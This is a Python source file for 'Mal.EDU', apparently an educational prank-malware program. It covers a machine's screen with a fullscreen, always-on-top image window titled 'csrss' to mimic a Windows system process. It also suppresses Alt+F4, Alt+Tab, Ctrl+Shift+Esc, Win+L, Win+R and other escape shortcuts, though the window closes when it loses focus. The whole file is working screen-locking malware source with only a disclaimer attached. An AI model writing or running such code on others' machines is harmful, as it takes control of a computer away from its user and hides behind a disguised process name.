import tkinter as tk
from PIL import Image, ImageTk
from tkinter import messagebox
import sys
import os
import keyboard
import time
#time.sleep(3)



"""Welcome to the code! If you wish to build yourself, be sure to read the WHOLE readme in Github."""
"""Please respect the GPLv3 lisense and give credit where it is due ;)"""

""""This is a complete rebuild of Mal.EDU from v0.2a. Instead of relying on Pygame for the window, tkinter is better for the job. """

""""⚠ DO NOT USE ANYTHING WITHIN THIS FILE FOR MALICIOUS PURPOSES. YOU ARE TO ONLY USE MAL.EDU ON A CONTROLLED COMPUTER."""
#that is a warning.


def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def on_focus_out(event):
    def check_focus():
        if not root.focus_displayof():  #check if the root window is currently not focused
            #messagebox.showinfo("Debug", "maledu lost window focus - quitting")
            root.destroy()
    root.after(100, check_focus)  #delay in ms. used to have less false positives.

root = tk.Tk()
root.title("csrss")

def print_number(num):
    print(num)
#key blockers
keyboard.add_hotkey("alt + f4", lambda: None, suppress =True)
keyboard.add_hotkey("alt + tab", lambda: None, suppress =True)
keyboard.add_hotkey("win + tab", lambda: None, suppress =True)
keyboard.add_hotkey("ctrl + esc", lambda: None, suppress =True)
keyboard.add_hotkey("win", lambda: None, suppress =True)
keyboard.add_hotkey('ctrl+alt+f4', lambda: None, suppress=True)
keyboard.add_hotkey('ctrl+shift+esc', lambda: None, suppress=True)
keyboard.add_hotkey('f11', lambda: None, suppress=True)
keyboard.add_hotkey('win+ctrl+d', lambda: None, suppress=True)
keyboard.add_hotkey('win+l', lambda: None, suppress=True)
keyboard.add_hotkey('win+r', lambda: None, suppress=True)
keyboard.add_hotkey('win+g', lambda: None, suppress=True)
keyboard.add_hotkey('alt+esc', lambda: None, suppress=True)
#loop to register each hotkey from 'win+1' to 'win+0'
for i in range(1, 10):
    keyboard.add_hotkey(f'win+{i}', lambda i=i: print_number(i), suppress=True)
keyboard.add_hotkey('win+0', lambda: print_number(0), suppress=True)
keyboard.add_hotkey('win+shift+0', lambda: print_number(0), suppress=True)


#using resource_path for compatibility with PyInstaller
icon_path = resource_path('icon.ico')
root.iconbitmap(icon_path)

#fullscreen
root.attributes('-fullscreen', True)

#keep window on top
root.attributes('-topmost', True)

#bind the focus-out event
root.bind("<FocusOut>", on_focus_out)

#load and display an image using PIL
image_path = resource_path('img.jpg')
img = Image.open(image_path)
img = img.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.Resampling.LANCZOS)  # Resize to fit the screen
photoImg = ImageTk.PhotoImage(img)

#display the image
label = tk.Label(root, image=photoImg)
label.pack(expand=True)

#run mal.edu
root.mainloop()